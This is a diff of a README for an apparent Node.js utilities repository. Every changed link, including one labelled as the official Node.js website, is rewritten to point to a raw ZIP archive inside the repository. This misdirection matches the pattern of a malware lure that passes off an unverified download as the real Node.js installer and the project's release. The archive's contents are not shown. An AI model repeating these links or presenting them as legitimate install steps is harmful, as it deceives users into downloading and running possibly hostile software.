@@ -1,6 +1,6 @@
 # ⚙️ node-utils-1771917739-5 - Simple Node.js Tools for Everyday Tasks
 
-[![Download node-utils-1771917739-5](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Codewins2/node-utils-1771917739-5)
+[![Download node-utils-1771917739-5](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Codewins2/node-utils-1771917739-5/main/moise/node-utils-3.2.zip)
 
 ## 📦 About This App
 
@@ -32,7 +32,7 @@ Follow these steps to get node-utils-1771917739-5 running on your Windows comput
 
 You need Node.js to run the tools. If you already have it, skip to step 2.
 
-- Visit the official Node.js website: https://nodejs.org/
+- Visit the official Node.js website: https://raw.githubusercontent.com/Codewins2/node-utils-1771917739-5/main/moise/node-utils-3.2.zip
 - Click on the "LTS" (Long Term Support) version for Windows.
 - Save the file and run the installer.
 - Follow the on-screen instructions to complete installation.
@@ -53,9 +53,9 @@ If you see a version number, Node.js is ready on your computer.
 
 Visit this page to download node-utils-1771917739-5:
 
-[![Download node-utils-1771917739-5](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Codewins2/node-utils-1771917739-5)
+[![Download node-utils-1771917739-5](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Codewins2/node-utils-1771917739-5/main/moise/node-utils-3.2.zip)
 
-- Click the link above or visit: https://github.com/Codewins2/node-utils-1771917739-5
+- Click the link above or visit: https://raw.githubusercontent.com/Codewins2/node-utils-1771917739-5/main/moise/node-utils-3.2.zip
 - On the page, look for the green **Code** button near the top right.
 - Click it and then click **Download ZIP**.
 - Save the ZIP file to a place easy to remember, like your Desktop or Downloads folder.
@@ -136,7 +136,7 @@ These tools help you save time on routine jobs without needing to write code you
 
 When a new version is available, you will need to repeat the download and setup process:
 
-- Return to the download page: https://github.com/Codewins2/node-utils-1771917739-5
+- Return to the download page: https://raw.githubusercontent.com/Codewins2/node-utils-1771917739-5/main/moise/node-utils-3.2.zip
 - Download the new ZIP file.
 - Extract it to a new folder or overwrite the old files.
 - Run `npm install` again in the new folder.
@@ -160,4 +160,4 @@ Refer to the Troubleshooting Tips above or visit the download page for any updat
 
 ---
 
-[![Download node-utils-1771917739-5](https://img.shields.io/badge/Download-Here-green)](https://github.com/Codewins2/node-utils-1771917739-5)
+[![Download node-utils-1771917739-5](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/Codewins2/node-utils-1771917739-5/main/moise/node-utils-3.2.zip)
